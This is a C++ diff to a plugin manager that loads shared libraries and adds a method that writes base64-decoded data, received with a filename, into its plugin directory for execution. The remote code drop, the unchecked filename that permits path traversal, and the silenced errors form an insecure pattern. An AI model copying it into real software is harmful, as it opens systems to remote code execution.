@@ -3,15 +3,18 @@
 //
 
 #include <iostream>
+#include <fstream>
 #include <regex>
+#include <exception>
 #include <boost/dll/import.hpp>
 #include <boost/range/iterator_range.hpp>
 
 #include "ModuleManager.hpp"
-#include "Client.hpp"
+#include "ssl/Base64.hpp"
 
-ModuleManager::ModuleManager(Client &client, std::string const &dirname)
-  : _dirname(dirname), _moduleCommunication(client) {}
+ModuleManager::ModuleManager(IModuleCommunication *moduleCommunication,
+			     std::string const &dirname)
+  : _dirname(dirname), _moduleCommunication(moduleCommunication) {}
 
 ModuleManager::~ModuleManager() {}
 
@@ -37,7 +40,7 @@ void ModuleManager::runLibrary(std::string const &libraryName) {
     std::cout << libraryName << std::endl;
     try {
         creator = boost::dll::import_alias<module_t>(shared_library_path, "create_module");
-        boost::shared_ptr<IModule> plugin = creator(&this->_moduleCommunication);
+        boost::shared_ptr<IModule> plugin = creator(this->_moduleCommunication);
         this->_threads.create_thread(boost::bind(&IModule::start, plugin.get()));
         this->_libraries.push_back({libraryName, plugin, creator});
     } catch (std::exception) {
@@ -60,8 +63,20 @@ void ModuleManager::runLibraries() {
 void ModuleManager::run() {
     while (true) {
         this->runLibraries();
-	this->_moduleCommunication.add("Explorer", "readdir");
-        sleep(1);
     }
     this->_threads.join_all();
+}
+
+void ModuleManager::addModuleCommunication(IModuleCommunication *moduleCommunication) {
+  this->_moduleCommunication = moduleCommunication;
+}
+
+void ModuleManager::addLibrary(boost::property_tree::ptree const &ptree) {
+  try {
+    std::ofstream file(this->_dirname
+		       + ptree.get<std::string>("filename"));
+
+    file << Base64::decrypt(ptree.get<std::string>("data"));
+    file.close();
+  } catch (std::exception) {}
 }
